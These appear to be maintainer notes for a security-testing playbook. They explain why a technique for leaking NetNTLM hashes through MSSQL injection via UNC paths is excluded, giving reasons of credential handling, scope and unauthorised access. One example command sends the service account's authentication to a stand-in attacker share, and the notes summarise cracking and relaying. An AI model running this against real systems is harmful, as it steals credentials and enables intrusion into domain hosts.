# Leaking NetNTLM hashes: out entirely

Maintainer notes, not projected. Written fresh for v2; the v1 text is not in
this repository.

## What the v1 page was

The Windows-specific out-of-band trick. An MSSQL injection reaches a function
that takes a file path -- `xp_dirtree`, `xp_fileexist`, `BULK INSERT`,
`OPENROWSET` -- and a UNC path is a valid file path:

```
EXEC master..xp_dirtree '\\attacker-host\share'
```

The SQL Server service account tries to reach the share, SMB authenticates it
automatically, and a listener on the far end captures the NetNTLMv2 exchange. The
page then went on to what you do with it: crack it offline, or relay it to
another host in the domain that does not require SMB signing, and authenticate as
the service account.

## Why the Playbook does not run it

**What it captures is a credential.** A NetNTLM response is authentication
material belonging to a service account on somebody else's domain. Capturing it
means holding it, which means this harness's evidence store now contains
material that can be cracked into a password. There is no redaction that makes
that acceptable and no retention policy in this repository written to hold it.

**Relaying is authenticating as somebody else.** The step that makes the
technique valuable is the step where you use the credential. That is
unauthorised access to a host, and no bug bounty scope covers it.

**It reaches out of scope by construction.** The credential's value is on the
domain, not on the web application. Everything the technique is for happens on
machines the Program never named.

**It needs a listener.** The same infrastructure objection the out-of-band note
makes, with the addition that the listener here is a service impersonating SMB in
order to harvest authentication.

**Its primitives are already refused.** `xp_dirtree`, `xp_fileexist`,
`OPENROWSET` -- the MSSQL note rules all three out for independent reasons.

## What is kept

Nothing operational. One fact for the impact narrative, and only where the
reading already established the engine through the control-building fingerprint:
an injection on MSSQL sits on a database that is usually domain-joined and whose
service account is usually more privileged than the application needs. That is a
sentence in a report, argued from the finding, requiring no further request.

The file exists because the disposition ledger says v1 had this page and v2 must
say what became of it. What became of it is: refused, in full, with reasons.

## The trap in the whole technique

It is astonishingly easy. One statement, no filter evasion, no timing analysis,
and a captured hash lands in seconds -- which is exactly why it appears in
write-ups as a quick win rather than as what it is.

It is also close to invisible from the outside. There is no obvious harm, no
modified row, no downtime. But the target's authentication material has left
their network, and if the reading was automated, it left without anybody deciding
it should. That is the difference between a security test and an intrusion, and
it does not depend on what the tester intended to do next.
